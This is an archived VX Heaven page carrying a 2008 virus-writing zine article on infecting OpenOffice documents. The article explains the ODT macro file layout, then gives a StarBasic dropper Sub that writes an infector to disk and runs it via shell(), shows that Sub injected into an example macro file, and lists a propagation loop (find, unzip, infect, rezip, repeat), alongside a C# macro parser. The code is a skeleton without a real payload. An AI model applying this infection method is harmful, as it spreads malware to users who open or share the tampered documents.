<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> WarGame 'Some ideas about OpenOffice infection' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="WarGame"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, WarGame,Some ideas about OpenOffice infection, quot, text, directory, settings, program, plain, xmla, openoffice, msgbox, macro, script, examplemacros, userdefined, code, write"/>
<meta name="Description" content="This article will try to explain a new way of infecting openoffice documents. Other OO virii have been written using the basic programming language offered by OO, like Starbucks, Stardust or the multi platform BadBunny. It is possible to infect the documents using their simple structure. Let's go!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"55c9283865669c0133ce35f9ae22b84e830bd912-1498757163-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vwg04.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Some ideas about OpenOffice infection</h1><p><a href="/lib/?lang=en&amp;author=WarGame"> WarGame</a><br/> <em><a href="/vx.php?fid=1581#f1581">Electrical Ordered Freedom #2 (EOF-DR-RRLF)</a></em><br/> <em>August 2008</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vwg04.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vwg04">Back to index</a>] [<a href="/lib/vwg04.html#disqus_thread">Comments</a>]<br/> 
<ol>
<li>Introduction</li>
<li>How an openoffice document is made</li>
<li>How to infect</li>
<li>Code</li>
<li>Last words</li>
<li>Greetz</li>
</ol>
<h2>1) Introduction</h2>
<p>This article will try to explain a new way of infecting openoffice documents. Other OO virii have been written using the basic programming language offered by OO, like Starbucks, Stardust or the multi platform BadBunny. It is possible to infect the documents using their simple structure. Let's go!</p>
<h2>2) How an openoffice document is made</h2>
<p>An OO document is simply a zip archive, so you can "open" a document with any archiving program. This is what you get (it should be the same for all OO documents, created by writer,calc, draw etc...):</p>
<dl>
<dt>content.xml</dt><dd>a plain text XML file</dd>
<dt>meta.xml</dt><dd>a plain text XML file</dd>
<dt>settings.xml</dt><dd>a plain text XML file</dd>
<dt>styles.xml</dt><dd>a plain text XML file</dd>
<dt>mimetype</dt><dd>a plain text file</dd>
<dt>META-INF</dt><dd>a directory</dd>
<dt>Configurations2</dt><dd>a directory</dd>
<dt>Thumbnails</dt><dd>a directory</dd>
<dt>Basic</dt><dd>a directory (very interesting!)</dd>
</dl>
<p>How you can see the archive contains text files and directories, I will not waste much time explaining all of them, their name suggest their meaning. Looking deeper I noticed the directory "Basic", it contains the macros defined in the document. This subdirectory contains:</p>
<dl>
<dt>script-lc.xml</dt><dd>a plain text XML file</dd>
<dt>Standard</dt><dd>a directory</dd>
</dl>
<p>The directory "Standard" contains:</p>
<dl>
<dt>script-lb.xml</dt><dd>a plain text XML file</dd>
<dt>UserDefined.xml</dt><dd>a plain text XML file (the name of this file depends by the user that created the macros)</dd>
</dl>
<p>Eureka! The file "UserDefined.xml" contains the basic code of the macros!!! We have to play with this file to infect a document using our own macro code. This is what it contains in my example file "Example.odt" (its name is ExampleMacros.xml):</p>
<p><strong>ExampleMacros.xml</strong></p>
<div class="xml" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;?xml</span> <span style="color: #000066;">version</span>=<span style="color: #ff0000;">&quot;1.0&quot;</span> <span style="color: #000066;">encoding</span>=<span style="color: #ff0000;">&quot;UTF-8&quot;</span><span style="color: #000000; font-weight: bold;">?&gt;</span></span><br/>
&nbsp; &nbsp;<span style="color: #00bbdd;">&lt;!DOCTYPE script:module PUBLIC &quot;-//OpenOffice.org//DTD OfficeDocument 1.0//EN&quot; &quot;module.dtd&quot;&gt;</span><br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;script:module</span> <span style="color: #000066;">xmlns:script</span>=<span style="color: #ff0000;">&quot;http://openoffice.org/2000/script&quot;</span> <span style="color: #000066;">script:name</span>=<span style="color: #ff0000;">&quot;ExampleMacros&quot;</span> <span style="color: #000066;">script:language</span>=<span style="color: #ff0000;">&quot;StarBasic&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span>REM first macro<br/>
&nbsp; &nbsp;Sub example1<br/>
&nbsp; &nbsp;msgbox <span style="color: #ddbb00;">&amp;quot;</span>example1<span style="color: #ddbb00;">&amp;quot;</span>,,<span style="color: #ddbb00;">&amp;quot;</span>example1<span style="color: #ddbb00;">&amp;quot;</span><br/>
&nbsp; &nbsp;End Sub<br/>
<br/>
&nbsp; &nbsp;REM second macro<br/>
&nbsp; &nbsp;Sub example2<br/>
&nbsp; &nbsp;msgbox <span style="color: #ddbb00;">&amp;quot;</span>example2<span style="color: #ddbb00;">&amp;quot;</span>,,<span style="color: #ddbb00;">&amp;quot;</span>example2<span style="color: #ddbb00;">&amp;quot;</span><br/>
&nbsp; &nbsp;End Sub<br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/script:module<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp;</div>
<p>The file is an xml document, it can be parsed in many ways, using libraries or writing your own procedures. We should do a check, infact it's possible to save the documents in an encrypted form using a password, let's look at script-lb.xml (this one is in my example file).</p>
<p><strong>script-lb.xml</strong></p>
<div class="xml" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;?xml</span> <span style="color: #000066;">version</span>=<span style="color: #ff0000;">&quot;1.0&quot;</span> <span style="color: #000066;">encoding</span>=<span style="color: #ff0000;">&quot;UTF-8&quot;</span><span style="color: #000000; font-weight: bold;">?&gt;</span></span><br/>
&nbsp; &nbsp;<span style="color: #00bbdd;">&lt;!DOCTYPE library:library PUBLIC &quot;-//OpenOffice.org//DTD OfficeDocument 1.0//EN&quot; &quot;library.dtd&quot;&gt;</span><br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;library:library</span> <span style="color: #000066;">xmlns:library</span>=<span style="color: #ff0000;">&quot;http://openoffice.org/2000/library&quot;</span> <span style="color: #000066;">library:name</span>=<span style="color: #ff0000;">&quot;Standard&quot;</span> <span style="color: #000066;">library:readonly</span>=<span style="color: #ff0000;">&quot;false&quot;</span> <span style="color: #000066;">library:passwordprotected</span>=<span style="color: #ff0000;">&quot;false&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;library:element</span> <span style="color: #000066;">library:name</span>=<span style="color: #ff0000;">&quot;ExampleMacros&quot;</span><span style="color: #000000; font-weight: bold;">/&gt;</span></span><br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/library:library<span style="color: #000000; font-weight: bold;">&gt;</span></span></span> &nbsp; <br/>
&nbsp;</div>
<p>We have to check library:passwordprotected, if it is set to true, the document is encrypted.</p>
<h2>3) How to infect</h2>
<p>We can infect it in two ways (maybe there are more, be creative!)</p>
<ol>
<li>Adding (or modifying an existing Sub) our own code that drops&amp;executes the code of the infector</li>
<li>Injecting a full functional oo virus written in basic</li>
</ol>
<p>I prefer the first one (the second one is useless for me), so our injected code should look like this:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #E56717; font-weight: bold;">Sub</span> DropInfector<br/>
&nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">open</span> path_to_write_the_infector <span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #151B8D; font-weight: bold;">output</span> <span style="color: #151B8D; font-weight: bold;">as</span> #1<br/>
&nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">print</span> #1,... REM write the code of the infector<br/>
&nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">close</span> #1<br/>
&nbsp; &nbsp;shell(path_to_write_the_infector,0) REM execute the infector<br/>
&nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">End</span> <span style="color: #E56717; font-weight: bold;">Sub</span><br/>
&nbsp;</div>
<p>So my example file "ExampleMacros.xml" would become:</p>
<div class="xml" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;?xml</span> <span style="color: #000066;">version</span>=<span style="color: #ff0000;">&quot;1.0&quot;</span> <span style="color: #000066;">encoding</span>=<span style="color: #ff0000;">&quot;UTF-8&quot;</span><span style="color: #000000; font-weight: bold;">?&gt;</span></span><br/>
&nbsp; &nbsp;<span style="color: #00bbdd;">&lt;!DOCTYPE script:module PUBLIC &quot;-//OpenOffice.org//DTD OfficeDocument 1.0//EN&quot; &quot;module.dtd&quot;&gt;</span><br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;script:module</span> <span style="color: #000066;">xmlns:script</span>=<span style="color: #ff0000;">&quot;http://openoffice.org/2000/script&quot;</span> <span style="color: #000066;">script:name</span>=<span style="color: #ff0000;">&quot;ExampleMacros&quot;</span> <span style="color: #000066;">script:language</span>=<span style="color: #ff0000;">&quot;StarBasic&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span>REM first macro<br/>
&nbsp; &nbsp;Sub example1<br/>
&nbsp; &nbsp;msgbox <span style="color: #ddbb00;">&amp;quot;</span>example1<span style="color: #ddbb00;">&amp;quot;</span>,,<span style="color: #ddbb00;">&amp;quot;</span>example1<span style="color: #ddbb00;">&amp;quot;</span><br/>
&nbsp; &nbsp;End Sub<br/>
<br/>
&nbsp; &nbsp;REM second macro<br/>
&nbsp; &nbsp;Sub example2<br/>
&nbsp; &nbsp;msgbox <span style="color: #ddbb00;">&amp;quot;</span>example2<span style="color: #ddbb00;">&amp;quot;</span>,,<span style="color: #ddbb00;">&amp;quot;</span>example2<span style="color: #ddbb00;">&amp;quot;</span><br/>
&nbsp; &nbsp;End Sub<br/>
<br/>
&nbsp; &nbsp;REM Sub added by our infector<br/>
&nbsp; &nbsp;Sub DropInfector<br/>
&nbsp; &nbsp;open path_to_write_the_infector for output as #1<br/>
&nbsp; &nbsp;print #1,... REM write the code of the infector<br/>
&nbsp; &nbsp;close #1<br/>
&nbsp; &nbsp;shell(path_to_write_the_infector,0) REM execute the infector<br/>
&nbsp; &nbsp;End Sub<br/>
&nbsp; &nbsp;<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/script:module<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp;</div>
<p>Our Sub could be also multi platform, look at BadBunny in DoomRiderz#1 for an example, to be more portable. This task could be done in languages like python or C++ that have libraries that help you to accomplish this job (unzipping,xml parsing,rezipping). This is the flow of the infection process:</p>
<ol>
<li>Find OpenOffice documents (FindFirstFile()/FindNextFile() for Windows, opendir() for unix like systems)</li>
<li>Unzip the found document (zlib can help)</li>
<li>Infect the UserDefined.xml file in the Standard directory</li>
<li>Rezip the document</li>
<li>Go to the first step</li>
</ol>
<p>An other idea for a nice payload could be editing "content.xml", so the user will see your message!</p>
<h2>4) Code</h2>
<p>This is an example C# program that shows you how to parse the xml file containing the macro code:</p>
<div class="csharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp;<span style="color: black; font-style: italic;">// GetMacroCode.cs</span><br/>
&nbsp; &nbsp;<span style="color: black; font-style: italic;">// you will need &quot;module.dtd&quot; in the same directory of the program</span><br/>
<br/>
&nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Collections.Generic</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Text</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">using</span> <span style="color: #008080;">System.Xml</span><span style="color: #008000;">;</span><br/>
<br/>
<br/>
&nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">namespace</span> GetMacroCode<br/>
&nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #6666cc; font-weight: bold;">class</span> Program<br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">static</span> <span style="color: #6666cc; font-weight: bold;">void</span> Main<span style="color: black;">&#40;</span><span style="color: #6666cc; font-weight: bold;">string</span><span style="color: black;">&#91;</span><span style="color: black;">&#93;</span> args<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>args<span style="color: #008000;">.</span><span style="color: #0000FF;">Length</span> <span style="color: #008000;">==</span> <span style="color: #FF0000;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Console<span style="color: #008000;">.</span><span style="color: #0000FF;">WriteLine</span><span style="color: black;">&#40;</span><span style="color: #666666;">&quot;Specify the xml file!&quot;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">// thx to Retr0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;XmlReaderSettings settings <span style="color: #008000;">=</span> <a style="color: #000060;" href="http://www.google.com/search?q=new+msdn.microsoft.com"><span style="color: #008000;">new</span></a> XmlReaderSettings<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;settings<span style="color: #008000;">.</span><span style="color: #0000FF;">ProhibitDtd</span> <span style="color: #008000;">=</span> <span style="color: #0600FF; font-weight: bold;">false</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;XmlReader xmlRead <span style="color: #008000;">=</span> XmlReader<span style="color: #008000;">.</span><span style="color: #0000FF;">Create</span><span style="color: black;">&#40;</span>args<span style="color: black;">&#91;</span><span style="color: #FF0000;">0</span><span style="color: black;">&#93;</span>,settings<span style="color: black;">&#41;</span><span style="color: #008000;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">while</span> <span style="color: black;">&#40;</span>xmlRead<span style="color: #008000;">.</span><span style="color: #0000FF;">Read</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0600FF; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>xmlRead<span style="color: #008000;">.</span><span style="color: #0000FF;">Name</span> <span style="color: #008000;">==</span> <span style="color: #666666;">&quot;script:module&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #6666cc; font-weight: bold;">string</span> macro_code <span style="color: #008000;">=</span> xmlRead<span style="color: #008000;">.</span><span style="color: #0000FF;">ReadString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span> <span style="color: black; font-style: italic;">// macro code is here</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Console<span style="color: #008000;">.</span><span style="color: #0000FF;">WriteLine</span><span style="color: black;">&#40;</span>macro_code<span style="color: black;">&#41;</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;xmlRead<span style="color: #008000;">.</span><span style="color: #0000FF;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #008000;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>You will need also the file module.dtd (it's attached to this article) to make this proggy works. (My suggestion is to read the xml file in a "raw" way, without using classes or other stuff).</p>
<h2>5) Last words</h2>
<p>The explained technique can be expanded in more original ways. OO is a nice suite, but its format is too vulnerable to this kind of attacks. For any comments you can send an e-mail to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="65120417020408005d5c251c040d0a0a4b0c11">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> Web: http://vx.netlux.org/wargamevx - http://vx.netlux.org/doomriderz Bye!</p>
<h2>6) Greetz</h2>
<p>A big thx goes to all #virus,#eof-project,#vx-lab @ undernet</p>
<p>Files:</p>
<ul>
<li><a href="files/vwg04/Example.odt">Example.odt</a></li>
<li><a href="files/vwg04/module.dtd">module.dtd</a></li>
</ul>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vwg04">de</a><a href="/lib/index.php?lang=en&amp;id=vwg04">en</a><a href="/lib/index.php?lang=es&amp;id=vwg04">es</a><a href="/lib/index.php?lang=it&amp;id=vwg04">it</a><a href="/lib/index.php?lang=fr&amp;id=vwg04">fr</a><a href="/lib/index.php?lang=pl&amp;id=vwg04">pl</a><a href="/lib/index.php?lang=ru&amp;id=vwg04">ru</a><a href="/lib/index.php?lang=ua&amp;id=vwg04">ua</a></div>
</body>
</html>
